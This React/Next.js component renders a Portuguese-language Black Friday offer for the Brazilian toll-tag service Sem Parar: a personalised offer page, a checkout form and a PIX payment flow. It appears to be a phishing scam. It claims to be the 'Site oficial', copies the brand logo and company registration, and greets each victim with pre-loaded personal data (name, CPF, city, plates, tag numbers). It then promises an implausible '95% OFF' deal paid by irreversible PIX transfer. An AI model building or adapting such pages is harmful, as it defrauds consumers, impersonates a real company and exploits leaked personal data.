'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';
import {
  Car,
  ParkingCircle,
  Fuel,
  Package,
  Smartphone,
  Mail,
  ShieldCheck,
  BadgeCheck,
  Check,
  ChevronRight
} from 'lucide-react';

interface LeadData {
  nrc: number;
  nome: string;
  firstName: string;
  email: string;
  cpf: string;
  cidade: string;
  estado: string;
  placas: string[];
  tags: string[];
  planos: string[];
  qtdVeiculos: number;
  situacao: number;
  mensalidadeAtual: number;
}

interface PixData {
  id: string;
  qrCodeBase64: string;
  copyPaste: string;
  amount: number;
  expiresAt: string;
}

export default function FunnelClient({ lead }: { lead: LeadData }) {
  const [step, setStep] = useState<'offer' | 'checkout' | 'success'>('offer');
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'paid'>('pending');
  const [copied, setCopied] = useState(false);
  const [formData, setFormData] = useState({
    cpf: lead.cpf || '',
    telefone: '',
    placa: lead.placas[0] || '',
    paymentMethod: 'pix',
  });

  const promoPrice = 29.90;
  const mensalidadeAtual = lead.mensalidadeAtual || 49.90;

  const handleCopyPix = () => {
    if (pixData?.copyPaste) {
      navigator.clipboard.writeText(pixData.copyPaste);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleConfirm = async () => {
    if (!formData.cpf) return;

    setLoading(true);
    try {
      const response = await fetch('/api/pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          nrc: lead.nrc,
          name: lead.nome,
          email: lead.email,
          cpf: formData.cpf,
          amount: promoPrice,
        }),
      });

      if (!response.ok) throw new Error('Falha ao gerar PIX');

      const pix = await response.json();
      setPixData(pix);
    } catch (error) {
      alert('Erro ao gerar pagamento. Tente novamente.');
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!pixData?.id || paymentStatus !== 'pending') return;

    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/pix?id=${pixData.id}`);
        const data = await response.json();
        if (data.status === 'paid' || data.status === 'approved' || data.status === 'completed') {
          setPaymentStatus('paid');
          setStep('success');
        }
      } catch (error) {
        console.error('Error checking payment:', error);
      }
    };

    const interval = setInterval(checkStatus, 5000);
    return () => clearInterval(interval);
  }, [pixData?.id, paymentStatus]);

  // Placa Mercosul Component
  const PlacaMercosul = ({ placa }: { placa: string }) => (
    <div className="flex-shrink-0">
      <div className="bg-white rounded-[4px] overflow-hidden shadow-sm border border-[#d1d5db]" style={{ width: '88px' }}>
        <div className="bg-[#003893] h-[14px] flex items-center justify-between px-1.5">
          <div className="flex items-center gap-[2px]">
            <div className="w-[5px] h-[5px] rounded-full bg-[#009739]"></div>
            <div className="w-[5px] h-[5px] rounded-full bg-[#FEDD00]"></div>
          </div>
          <span className="text-white text-[5px] font-semibold tracking-wide">BRASIL</span>
          <div className="bg-[#009739] rounded-[2px] px-[3px] py-[1px]">
            <span className="text-white text-[4px] font-bold">BR</span>
          </div>
        </div>
        <div className="bg-white py-[6px]">
          <p className="text-[#1a1a1a] text-[13px] font-bold font-mono text-center tracking-[0.08em]">
            {placa}
          </p>
        </div>
      </div>
    </div>
  );

  // TAG Sem Parar Component
  const TagSemParar = ({ numero }: { numero: string }) => (
    <div className="flex-shrink-0">
      <div className="bg-white rounded-[4px] overflow-hidden shadow-sm border border-[#d1d5db]" style={{ width: '88px' }}>
        <div className="bg-gradient-to-r from-[#FFD000] to-[#FFBA00] h-[14px] flex items-center justify-center gap-1">
          <div className="w-[4px] h-[4px] rounded-full bg-[#d60b52]"></div>
          <span className="text-[#1a1a1a] text-[5px] font-bold tracking-wide">SEM PARAR</span>
        </div>
        <div className="bg-white py-[6px]">
          <p className="text-[#1a1a1a] text-[10px] font-semibold font-mono text-center tracking-wide">
            {numero}
          </p>
        </div>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-[#fafafa] flex flex-col">
      {/* Header */}
      <header className="bg-white border-b border-[#e5e7eb] sticky top-0 z-50">
        <div className="max-w-3xl mx-auto px-4 sm:px-6 py-4 flex items-center justify-between">
          <Image src="/logo.png" alt="Sem Parar" width={110} height={30} className="h-7 w-auto" />
          <div className="hidden sm:flex items-center gap-1 text-[13px] text-[#6b7280]">
            <ShieldCheck className="w-4 h-4 text-[#10b981]" strokeWidth={2} />
            <span>Site oficial</span>
          </div>
        </div>
      </header>

      {/* PAGINA DA OFERTA */}
      {step === 'offer' && (
        <main className="flex-1 w-full">
          <div className="max-w-2xl mx-auto px-4 sm:px-6 py-8 sm:py-12">

            {/* Badge */}
            <div className="text-center mb-6">
              <span className="inline-flex items-center gap-1.5 bg-[#d60b52] text-white text-[11px] font-semibold px-4 py-2 rounded-full shadow-sm">
                <span className="w-1.5 h-1.5 bg-white rounded-full animate-pulse"></span>
                OFERTA EXCLUSIVA
              </span>
            </div>

            {/* Titulo */}
            <div className="text-center mb-10">
              <h1 className="text-[#111827] text-[26px] sm:text-[32px] font-bold leading-tight mb-5">
                {lead.firstName}, voce foi selecionado!
              </h1>

              {/* Preco */}
              <div className="inline-flex flex-col items-center bg-white rounded-2xl px-8 py-6 shadow-sm border border-[#e5e7eb]">
                <span className="text-[#d60b52] text-[48px] sm:text-[56px] font-bold leading-none">
                  R$ {promoPrice.toFixed(2).replace('.', ',')}
                </span>
                <span className="text-[#374151] text-base font-medium mt-1">pelo ano inteiro</span>
                <div className="flex items-center gap-2 mt-3">
                  <span className="text-[#9ca3af] text-sm line-through">R$ {mensalidadeAtual.toFixed(2).replace('.', ',')}/mes</span>
                  <span className="bg-[#dcfce7] text-[#166534] text-xs font-semibold px-2 py-0.5 rounded-full">95% OFF</span>
                </div>
              </div>
            </div>

            {/* Card do Cliente */}
            <div className="bg-white rounded-2xl border border-[#e5e7eb] shadow-sm overflow-hidden mb-8">
              {/* Header do card */}
              <div className="px-5 py-4 border-b border-[#f3f4f6] flex items-center gap-4">
                <div className="w-11 h-11 bg-gradient-to-br from-[#d60b52] to-[#a50840] rounded-full flex items-center justify-center text-white text-lg font-semibold shadow-sm">
                  {lead.firstName.charAt(0)}
                </div>
                <div className="flex-1 min-w-0">
                  <p className="text-[#111827] font-semibold text-[15px] truncate">{lead.nome}</p>
                  <p className="text-[#6b7280] text-[13px]">{lead.cidade}/{lead.estado}</p>
                </div>
                <span className="inline-flex items-center gap-1 bg-[#f0fdf4] text-[#166534] text-[11px] font-medium px-2.5 py-1 rounded-full border border-[#bbf7d0]">
                  <BadgeCheck className="w-3.5 h-3.5" strokeWidth={2} />
                  Cliente ativo
                </span>
              </div>

              {/* Placas e TAGs */}
              <div className="p-5">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                  {/* Placas */}
                  <div>
                    <p className="text-[#6b7280] text-[11px] font-medium uppercase tracking-wider mb-3">
                      {lead.placas.length} Veiculo{lead.placas.length !== 1 ? 's' : ''} cadastrado{lead.placas.length !== 1 ? 's' : ''}
                    </p>
                    <div className="flex flex-wrap gap-2">
                      {lead.placas.slice(0, 3).map((placa, i) => (
                        <PlacaMercosul key={i} placa={placa} />
                      ))}
                      {lead.placas.length > 3 && (
                        <span className="text-[#9ca3af] text-xs self-center">+{lead.placas.length - 3}</span>
                      )}
                    </div>
                  </div>

                  {/* TAGs */}
                  <div>
                    <p className="text-[#6b7280] text-[11px] font-medium uppercase tracking-wider mb-3">
                      {lead.tags.length} TAG{lead.tags.length !== 1 ? 's' : ''} ativa{lead.tags.length !== 1 ? 's' : ''}
                    </p>
                    <div className="flex flex-wrap gap-2">
                      {lead.tags.slice(0, 3).map((tag, i) => (
                        <TagSemParar key={i} numero={tag} />
                      ))}
                      {lead.tags.length > 3 && (
                        <span className="text-[#9ca3af] text-xs self-center">+{lead.tags.length - 3}</span>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Beneficios */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-8">
              {[
                { Icon: Car, line1: '1 Ano Sem', line2: 'Pedagio', color: '#d60b52' },
                { Icon: ParkingCircle, line1: '1 Ano Sem', line2: 'Estacionamento', color: '#d60b52' },
                { Icon: null, line1: '30% OFF', line2: "McDonald's", color: null, isMcDonalds: true },
                { Icon: Fuel, line1: '-R$ 0,20', line2: '/Litro', color: '#d60b52' },
              ].map((item, i) => (
                <div key={i} className="bg-white rounded-xl p-4 border border-[#e5e7eb] text-center hover:border-[#d60b52]/30 hover:shadow-sm transition-all">
                  <div className="flex justify-center mb-2.5 h-8 items-center">
                    {item.isMcDonalds ? (
                      <Image src="/mcdonalds.svg" alt="McDonald's" width={28} height={28} className="h-7 w-auto" />
                    ) : item.Icon && (
                      <item.Icon className="w-7 h-7" style={{ color: item.color }} strokeWidth={1.5} />
                    )}
                  </div>
                  <p className="text-[#111827] text-[13px] font-semibold leading-tight">{item.line1}</p>
                  <p className="text-[#111827] text-[13px] font-semibold leading-tight">{item.line2}</p>
                </div>
              ))}
            </div>

            {/* Trust badges */}
            <div className="flex items-center justify-center gap-6 mb-8">
              <span className="flex items-center gap-1.5 text-[#6b7280] text-[13px]">
                <Check className="w-4 h-4 text-[#10b981]" strokeWidth={2.5} />
                Sem fidelidade
              </span>
              <span className="flex items-center gap-1.5 text-[#6b7280] text-[13px]">
                <Check className="w-4 h-4 text-[#10b981]" strokeWidth={2.5} />
                Cancele quando quiser
              </span>
            </div>

            {/* CTA */}
            <button
              onClick={() => setStep('checkout')}
              className="w-full bg-[#d60b52] hover:bg-[#b8094a] active:bg-[#9a0840] text-white font-semibold text-base py-4 rounded-xl transition-all shadow-sm hover:shadow-md flex items-center justify-center gap-2"
            >
              Quero aproveitar esta oferta
              <ChevronRight className="w-5 h-5" strokeWidth={2} />
            </button>
          </div>
        </main>
      )}

      {/* CHECKOUT */}
      {step === 'checkout' && (
        <main className="flex-1 w-full">
          <div className="max-w-lg mx-auto px-4 sm:px-6 py-8 sm:py-12">

            {/* Titulo */}
            <div className="text-center mb-8">
              <h1 className="text-[#111827] text-[22px] sm:text-[26px] font-bold leading-tight">
                Finalize sua assinatura
              </h1>
              <p className="text-[#6b7280] text-[15px] mt-2">Black Friday Sem Parar</p>
            </div>

            {/* Resumo */}
            <div className="bg-white rounded-xl border border-[#e5e7eb] p-5 mb-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-[#111827] font-semibold text-[15px]">Plano Anual</p>
                  <p className="text-[#6b7280] text-[13px]">+ 4 Beneficios Black Friday</p>
                </div>
                <p className="text-[#d60b52] text-2xl font-bold">R$ {promoPrice.toFixed(2).replace('.', ',')}</p>
              </div>
            </div>

            {/* Formulario */}
            <div className="bg-white rounded-xl border border-[#e5e7eb] p-5 mb-6 space-y-5">
              <div>
                <label className="block text-[#374151] text-[13px] font-medium mb-2">Dados Pessoais</label>
                <div className="grid grid-cols-2 gap-3">
                  <input
                    type="text"
                    value={formData.cpf}
                    onChange={(e) => setFormData({ ...formData, cpf: e.target.value })}
                    className="w-full border border-[#d1d5db] rounded-lg px-4 py-3 text-[#111827] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#d60b52]/20 focus:border-[#d60b52] transition-all"
                    placeholder="CPF"
                  />
                  <input
                    type="text"
                    value={formData.telefone}
                    onChange={(e) => setFormData({ ...formData, telefone: e.target.value })}
                    className="w-full border border-[#d1d5db] rounded-lg px-4 py-3 text-[#111827] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#d60b52]/20 focus:border-[#d60b52] transition-all"
                    placeholder="Telefone"
                  />
                </div>
              </div>

              <div>
                <label className="block text-[#374151] text-[13px] font-medium mb-2">Dados do Veiculo</label>
                <input
                  type="text"
                  value={formData.placa}
                  onChange={(e) => setFormData({ ...formData, placa: e.target.value })}
                  className="w-full border border-[#d1d5db] rounded-lg px-4 py-3 text-[#111827] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#d60b52]/20 focus:border-[#d60b52] transition-all"
                  placeholder="Placa"
                />
              </div>

              <div>
                <label className="block text-[#374151] text-[13px] font-medium mb-2">Forma de Pagamento</label>
                <select
                  value={formData.paymentMethod}
                  onChange={(e) => setFormData({ ...formData, paymentMethod: e.target.value })}
                  className="w-full border border-[#d1d5db] rounded-lg px-4 py-3 text-[#111827] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#d60b52]/20 focus:border-[#d60b52] bg-white transition-all"
                >
                  <option value="pix">PIX</option>
                  <option value="cartao">Cartao de Credito</option>
                </select>
              </div>
            </div>

            {/* QR Code PIX */}
            {pixData && (
              <div className="bg-white rounded-xl border border-[#e5e7eb] p-6 mb-6 text-center">
                <p className="text-[#111827] font-semibold text-[15px] mb-4">Escaneie o QR Code</p>
                {pixData.qrCodeBase64 && (
                  <div className="bg-[#f9fafb] rounded-xl p-4 inline-block mb-4">
                    <img src={`data:image/png;base64,${pixData.qrCodeBase64}`} alt="QR Code" className="w-44 h-44" />
                  </div>
                )}
                <div className="flex gap-2 max-w-sm mx-auto">
                  <code className="flex-1 text-[#374151] text-xs bg-[#f9fafb] border border-[#e5e7eb] rounded-lg p-3 text-left truncate font-mono">
                    {pixData.copyPaste}
                  </code>
                  <button
                    onClick={handleCopyPix}
                    className="bg-[#111827] hover:bg-[#1f2937] text-white font-medium text-sm px-4 py-2 rounded-lg transition-colors"
                  >
                    {copied ? 'Copiado!' : 'Copiar'}
                  </button>
                </div>
                <p className="text-[#6b7280] text-sm mt-4 flex items-center justify-center gap-2">
                  <span className="w-2 h-2 bg-[#f59e0b] rounded-full animate-pulse"></span>
                  Aguardando pagamento...
                </p>
              </div>
            )}

            {/* Trust badges */}
            <div className="flex items-center justify-center gap-6 mb-6">
              <span className="flex items-center gap-1.5 text-[#6b7280] text-[13px]">
                <ShieldCheck className="w-4 h-4 text-[#10b981]" strokeWidth={2} />
                100% Seguro
              </span>
              <span className="flex items-center gap-1.5 text-[#6b7280] text-[13px]">
                <BadgeCheck className="w-4 h-4 text-[#d60b52]" strokeWidth={2} />
                Sem Parar Oficial
              </span>
            </div>

            {/* CTA */}
            <button
              onClick={handleConfirm}
              disabled={loading || !formData.cpf}
              className="w-full bg-[#d60b52] hover:bg-[#b8094a] active:bg-[#9a0840] text-white font-semibold text-base py-4 rounded-xl transition-all shadow-sm hover:shadow-md disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:shadow-sm"
            >
              {loading ? 'Processando...' : `Confirmar e Pagar R$ ${promoPrice.toFixed(2).replace('.', ',')}`}
            </button>

            <button
              onClick={() => setStep('offer')}
              className="w-full text-[#6b7280] hover:text-[#374151] text-sm font-medium py-3 mt-2 transition-colors"
            >
              ← Voltar para a oferta
            </button>
          </div>
        </main>
      )}

      {/* SUCESSO */}
      {step === 'success' && (
        <main className="flex-1 w-full">
          <div className="max-w-lg mx-auto px-4 sm:px-6 py-12 sm:py-16">

            {/* Check */}
            <div className="text-center mb-10">
              <div className="w-20 h-20 bg-[#dcfce7] rounded-full flex items-center justify-center mx-auto mb-6 shadow-sm">
                <Check className="w-10 h-10 text-[#16a34a]" strokeWidth={3} />
              </div>
              <h1 className="text-[#111827] text-[26px] sm:text-[32px] font-bold mb-2">
                Assinatura confirmada!
              </h1>
              <p className="text-[#6b7280] text-base">
                Seus beneficios Black Friday ja estao ativos
              </p>
            </div>

            {/* Proximos passos */}
            <div className="space-y-3">
              {[
                { Icon: Package, title: 'Envio da TAG', desc: 'Chegara em ate 7 dias uteis' },
                { Icon: Smartphone, title: 'Acesse o App', desc: 'Use seus beneficios agora' },
                { Icon: Mail, title: 'E-mail enviado', desc: 'Confira sua caixa de entrada' },
              ].map((item, i) => (
                <div key={i} className="bg-white rounded-xl border border-[#e5e7eb] p-4 flex items-center gap-4">
                  <div className="w-11 h-11 bg-[#fdf2f4] rounded-full flex items-center justify-center flex-shrink-0">
                    <item.Icon className="w-5 h-5 text-[#d60b52]" strokeWidth={1.5} />
                  </div>
                  <div>
                    <p className="text-[#111827] font-semibold text-[15px]">{item.title}</p>
                    <p className="text-[#6b7280] text-[13px]">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </main>
      )}

      {/* Footer */}
      <footer className="bg-white border-t border-[#e5e7eb] mt-auto">
        <div className="max-w-3xl mx-auto px-4 sm:px-6 py-6 text-center">
          <Image src="/logo.png" alt="Sem Parar" width={72} height={20} className="h-5 w-auto mx-auto mb-3 opacity-40" />
          <p className="text-[#9ca3af] text-[11px]">
            DBTrans Internet Ltda. · CNPJ 10.558.633/0001-61
          </p>
        </div>
      </footer>
    </div>
  );
}
